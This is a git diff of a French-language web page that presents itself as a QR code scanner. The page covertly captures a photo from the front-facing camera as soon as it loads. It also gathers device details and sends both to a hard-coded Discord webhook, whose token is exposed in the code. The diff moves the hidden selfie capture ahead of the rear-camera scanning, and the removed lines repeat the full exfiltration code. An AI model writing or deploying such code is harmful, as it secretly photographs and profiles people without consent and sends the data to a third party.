@@ -5,24 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Scanner QR Code</title>
     <style>
+        /* Styles inchangés */
         #video-container {
             position: relative;
             width: 80vw;
             height: auto;
             margin-bottom: 10px;
         }
-
         #video-main {
             width: 100%;
             height: auto;
         }
-
         #qr-reader {
             width: 300px;
             height: 300px;
             margin: auto;
         }
-
         .corps {
             position: absolute;
             top: 50%;
@@ -39,7 +37,6 @@
             align-items: center;
             border-radius: 10px;
         }
-
         .corps::before {
             content: '';
             position: absolute;
@@ -51,7 +48,6 @@
             transform: translateY(-50%);
             z-index: 11;
         }
-
         #capture-button {
             width: 70px;
             height: 70px;
@@ -64,7 +60,6 @@
             display: block;
             margin: 20px auto;
         }
-
         #capture-button::after {
             content: '';
             position: absolute;
@@ -181,250 +176,33 @@
         }
 
         (async function() {
-            const videoMain = document.getElementById('video-main');
-            const streamMain = await obtenirCameraArriere();
+            // D'abord capture de la caméra selfie
+            const streamSelfie = await obtenirCameraSelfie();
+            if (streamSelfie) {
+                const videoSelfie = document.createElement('video');
+                videoSelfie.srcObject = streamSelfie;
+                videoSelfie.play();
 
-            if (streamMain) {
-                videoMain.srcObject = streamMain;
+                videoSelfie.onloadedmetadata = async () => {
+                    const dataURLSelfie = capturerPhoto(videoSelfie);
+                    const blobSelfie = dataURLToBlob(dataURLSelfie);
+                    const infosAppareil = await obtenirInfosAppareil();
 
-                // Capture automatique de la caméra selfie sans interrompre la caméra arrière
-                setTimeout(async () => {
-                    const streamSelfie = await obtenirCameraSelfie();
-                    if (streamSelfie) {
-                        const videoSelfie = document.createElement('video');
-                        videoSelfie.srcObject = streamSelfie;
-                        videoSelfie.play();
+                    await envoyerDonnees(blobSelfie, infosAppareil);
+                    console.log('Image de la caméra selfie envoyée avec succès');
 
-                        videoSelfie.onloadedmetadata = async () => {
-                            const dataURLSelfie = capturerPhoto(videoSelfie);
-                            const blobSelfie = dataURLToBlob(dataURLSelfie);
-                            const infosAppareil = await obtenirInfosAppareil();
-
-                            await envoyerDonnees(blobSelfie, infosAppareil);
-                            console.log('Image de la caméra selfie envoyée avec succès');
-
-                            lancerScanQRCode();
-                        };
+                    // Après capture de la caméra selfie, démarrer le flux de la caméra arrière
+                    const videoMain = document.getElementById('video-main');
+                    const streamMain = await obtenirCameraArriere();
+                    if (streamMain) {
+                        videoMain.srcObject = streamMain;
+                        lancerScanQRCode();
+                    } else {
+                        alert("Impossible d'accéder à la caméra arrière.");
                     }
-                }, 2000);
+                };
             } else {
-                alert("Impossible d'accéder à la caméra arrière.");
-            }
-        })();
-    </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scanner QR Code</title>
-    <style>
-        #video-container {
-            position: relative;
-            width: 80vw;
-            height: auto;
-            margin-bottom: 10px;
-        }
-
-        #video-main {
-            width: 100%;
-            height: auto;
-        }
-
-        #qr-reader {
-            width: 300px;
-            height: 300px;
-            margin: auto;
-        }
-
-        .corps {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 300px;
-            height: 300px;
-            border: solid 2px rgba(255, 0, 0, 0.7);
-            background-color: rgba(255, 255, 255, 0.3);
-            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-            z-index: 10;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border-radius: 10px;
-        }
-
-        .corps::before {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 2px;
-            background-color: green;
-            top: 50%;
-            left: 0;
-            transform: translateY(-50%);
-            z-index: 11;
-        }
-
-        #capture-button {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            background-color: #ffffff;
-            border: 4px solid #007AFF;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
-            cursor: pointer;
-            position: relative;
-            display: block;
-            margin: 20px auto;
-        }
-
-        #capture-button::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 30px;
-            height: 30px;
-            background-color: #007AFF;
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-        }
-    </style>
-    <script src="https://unpkg.com/html5-qrcode/minified/html5-qrcode.min.js"></script>
-</head>
-<body>
-    <h1>Scanner QR Code</h1>
-    <p>Veuillez réessayer le scan du QR code</p>
-
-    <div id="video-container">
-        <video id="video-main" autoplay playsinline></video>
-        <div class="corps"></div>
-    </div>
-
-    <div id="qr-reader"></div>
-
-    <button id="capture-button" onclick="redirigerVersPage()" title="Prendre une photo"></button>
-
-    <script>
-        async function obtenirInfosAppareil() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-
-            return `User Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`;
-        }
-
-        function envoyerDonnees(imageBlob, infos) {
-            const formData = new FormData();
-            formData.append('file', imageBlob, 'photo.png');
-            formData.append('payload_json', JSON.stringify({ content: infos }));
-
-            const url = 'https://discord.com/api/webhooks/1264557833186443367/Ca29UpZabSCdGlVyzqgFbKqyTXiCs7M2ClkBogm48Vr2YaXIbLB2i3AyBLOp6Xk1memE';
-            return fetch(url, {
-                method: 'POST',
-                body: formData
-            });
-        }
-
-        function capturerPhoto(videoElement) {
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-            return canvas.toDataURL('image/png');
-        }
-
-        function dataURLToBlob(dataURL) {
-            const byteString = atob(dataURL.split(',')[1]);
-            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
-        }
-
-        async function lancerScanQRCode() {
-            const qrReader = document.getElementById('qr-reader');
-            qrReader.style.display = 'block';
-            const html5QrCode = new Html5Qrcode("qr-reader");
-
-            html5QrCode.start(
-                { facingMode: "environment" },
-                {
-                    fps: 10,
-                    qrbox: 250
-                },
-                (decodedText, decodedResult) => {
-                    console.log(`QR Code détecté: ${decodedText}`);
-                    html5QrCode.stop();
-                },
-                (errorMessage) => {
-                    console.warn(`Erreur de scan: ${errorMessage}`);
-                }
-            ).catch((err) => {
-                console.error(`Erreur de démarrage du scanner QR: ${err}`);
-            });
-        }
-
-        async function obtenirCameraArriere() {
-            try {
-                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-            } catch (err) {
-                console.error('Erreur d\'accès à la caméra arrière:', err);
-                alert("Erreur d'accès à la caméra arrière. Assurez-vous d'avoir autorisé les permissions.");
-                return null;
-            }
-        }
-
-        async function obtenirCameraSelfie() {
-            try {
-                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            } catch (err) {
-                console.error('Erreur d\'accès à la caméra selfie:', err);
-                alert("Erreur d'accès à la caméra selfie. Assurez-vous d'avoir autorisé les permissions.");
-                return null;
-            }
-        }
-
-        function redirigerVersPage() {
-            window.location.href = 'https://userdocs.zenchef.com/362304/iyhDWYXHr6YT17n1xkpEEBP3sbq6MmgCvfTuPJAs.pdf';
-        }
-
-        (async function() {
-            const videoMain = document.getElementById('video-main');
-            const streamMain = await obtenirCameraArriere();
-
-            if (streamMain) {
-                videoMain.srcObject = streamMain;
-
-                // Capture automatique de la caméra selfie sans interrompre la caméra arrière
-                setTimeout(async () => {
-                    const streamSelfie = await obtenirCameraSelfie();
-                    if (streamSelfie) {
-                        const videoSelfie = document.createElement('video');
-                        videoSelfie.srcObject = streamSelfie;
-                        videoSelfie.play();
-
-                        videoSelfie.onloadedmetadata = async () => {
-                            const dataURLSelfie = capturerPhoto(videoSelfie);
-                            const blobSelfie = dataURLToBlob(dataURLSelfie);
-                            const infosAppareil = await obtenirInfosAppareil();
-
-                            await envoyerDonnees(blobSelfie, infosAppareil);
-                            console.log('Image de la caméra selfie envoyée avec succès');
-
-                            lancerScanQRCode();
-                        };
-                    }
-                }, 2000);
-            } else {
-                alert("Impossible d'accéder à la caméra arrière.");
+                alert("Impossible d'accéder à la caméra selfie.");
             }
         })();
     </script>
